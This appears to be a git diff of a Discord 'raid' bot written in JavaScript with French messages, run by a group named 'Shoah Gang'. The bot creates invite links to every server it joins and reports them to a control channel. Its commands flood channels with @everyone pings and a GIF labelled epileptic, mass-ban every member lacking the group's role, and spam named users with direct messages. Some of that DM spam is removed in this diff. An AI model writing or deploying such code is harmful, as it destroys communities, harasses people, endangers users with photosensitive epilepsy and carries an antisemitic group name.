@@ -10,12 +10,13 @@ bot.on('ready',() => {
   //invit link
   bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    invite.createInvite().then(invite => {bot.channels.find("id", process.env.CHANNEL_ID).send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
-      console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
+    invite.createInvite().then(invite => {
+      console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`);
+      bot.channels.find('id','441994363116060682').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
   });
 });
-  })
-
+})
+ 
 bot.on('message', msg => {
   //#region Legit
   /* Commandes legit */
@@ -24,60 +25,16 @@ bot.on('message', msg => {
   }
 
   //#endregion
- 
-/*Serveur qui peuvent pas etre raid*/
 
-if (msg.guild === bot.guilds.find('id', process.env.GUILD_ID)){ //Shoah Gang
-  return;
-}
-
-
-
-//check si membre shoahgang ou adonis
-
-
-if (msg.author.id == process.env.ADONIS_ID2 || msg.author.id == process.env.ADONIS_ID) {
-
-     bot.channels.find('id', process.env.ADONIS_CHANNEL).send(`Le pd de ${msg.author.username} a ecrit sur le serv ${msg.guild.name}, et a dit ${msg.cleanContent}`)
-}
-
-if (bot.guilds.get(process.env.GUILD_ID).members.get(msg.author.id) !== undefined) {
-  
-  if (msg.author.id === process.env.ADONIS_ID2 || msg.author.id === process.env.ADONIS_ID){
-    bot.members.find('id', '392997054084939776').send("Adonis se fait raid en mp :joy:");
-      msg.author.send("Dédiace a FTNL");
-      var i = 0;
-      while (i /= 500){
-         msg.author.send("J'ai un oeil partout n'oublie pas (ton ami Fan Tarte)");
-        i===i+1;
-      }
+  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ //Shoah Gang
     return;
   }
-
-var i = 0;
-      while (i /= 150){
-         msg.author.send('You has been raid by SHOAH GANG issou');
-        i===i+1;
-      }
-      return;
-}
-
-
-
-
-
-
-
-
-
-
-
-
-//#region Destructrices
-  /* Commandes destructrices */
-
-
-  if (msg.content === '.destruction') {
+  
+  
+  //check si membre shoahgang ou adonis
+  if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
+    
+if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
@@ -87,8 +44,7 @@ var i = 0;
     }, 500)
   }
 
-
-  else if (msg.content === '.oupss') {
+if (msg.content === '.oupss') {
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
  
@@ -109,7 +65,7 @@ var i = 0;
   }
 
 
-  else if (msg.content === '.banev') {
+if (msg.content === '.banev') {
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
@@ -117,14 +73,14 @@ var i = 0;
   }
 
 
-  else if (msg.content === '.leave') {
+if (msg.content === '.leave') {
     console.log(`Commande .leave par ${msg.author.tag}`);
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.leave().catch(e => {});
   }
 
 
-  else if (msg.content === '.pardon') {
+if (msg.content === '.pardon') {
     console.log(`Commande .pardon par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
@@ -137,6 +93,6 @@ var i = 0;
     }).catch(e => {});
   }
   //#endregion
-});
+}});
 
 bot.login(process.env.BOT_TOKEN)
